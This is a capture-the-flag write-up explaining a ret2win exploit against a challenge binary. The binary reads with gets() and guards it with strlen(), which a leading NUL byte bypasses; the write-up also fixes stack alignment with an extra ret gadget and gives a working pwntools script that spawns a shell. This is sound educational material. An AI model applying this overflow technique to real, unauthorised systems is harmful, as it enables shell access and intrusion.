# Safe Gets — Pwn (Easy, ~pts)

**Flag:** `r00t{0nly_1_w4y_t0_w1n}`

## Description

A binary that reads input with `gets()` — but claims to be "safe." A `flag.txt` on the box uses a `flag{...}` prefix internally, though the actual submission format for this event is `r00t{...}` (worth noting since it briefly caused confusion during the solve).

## Binary Protections

```
$ checksec --file=chall
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

No canary, no PIE, and — since the binary isn't stripped — a literal `win()` function visible in the symbol table at a **fixed** address:

```
0000000000401244 T win
```

`strings` confirms `win()` contains `"Congratulations you win"` and `/bin/sh` — this is a textbook ret2win setup, no info leak needed since the load address is fixed.

## The "Safe" Trick — And Its Bypass

The vulnerable input function calls `gets()` into a stack buffer, but immediately follows it with a `strlen()` length check — if the resulting string is longer than 10 characters, it calls `exit(1)` before ever reaching the vulnerable function epilogue (`leave; ret`).

**The bypass:** `gets()` has no concept of "length" — it reads until `\n` or EOF, writing every byte you send regardless of content, including embedded NUL bytes. `strlen()`, on the other hand, stops counting at the **first** `\x00` it encounters. So: put a `\x00` as the very first byte of the payload. `gets()` still writes the entire overflow (including the forged return address) onto the stack — but `strlen()` sees a zero-length string, sails under the length check, and execution proceeds straight to the vulnerable `ret`.

## Stack Layout

- Buffer starts at `rbp-0x14`
- Saved `rbp` at `rbp+0`
- Saved return address at `rbp+8`
- → **28 bytes** from buffer start to the return address slot

## Exploit (pwntools)

First attempt (`\x00`-prefixed padding + `win()` address alone) caused a SIGSEGV *inside* `win()`'s own `system("/bin/sh")` call — a classic **stack-alignment** issue: glibc's `system()` internally uses SSE instructions (`movaps`) that fault on a misaligned (non-16-byte-aligned) `rsp`. A `ret2win` that jumps directly into a function (skipping its normal `call` instruction, which would've pushed a return address and fixed the alignment) can land one `push` short of correct alignment.

**Fix:** insert one extra bare `ret` gadget (found at `0x401243`, the tail end of an adjacent function) *before* jumping into `win()` — this consumes exactly 8 bytes off the stack, correcting the alignment by one slot.

```python
from pwn import *

p = process('./chall')  # or remote(host, port) for the live instance

ret_gadget = p64(0x401243)   # bare `ret` — fixes SSE stack alignment
win_addr   = p64(0x401244)   # win() — prints message, spawns /bin/sh

payload  = b'\x00'            # kills strlen()'s count immediately
payload += b'A' * 27          # pad out to the saved-return-address slot (28 bytes total to that point)
payload += ret_gadget         # alignment fixer
payload += win_addr           # actual redirect

p.sendline(payload)
p.interactive()
```

## Result

```
Congratulations you win
$ cat flag.txt
r00t{0nly_1_w4y_t0_w1n}
```

## Lesson

Two reusable patterns here: (1) a `gets()` + `strlen()` length "check" is not a real bounds check — `gets()` doesn't respect NUL bytes, so a single leading `\x00` defeats any post-hoc `strlen()`-based gate entirely; and (2) when a direct jump into a win-function segfaults inside its own libc calls (especially `system()`), suspect **stack misalignment** first — an extra `ret` gadget spliced in before the final jump is a cheap, reliable fix.
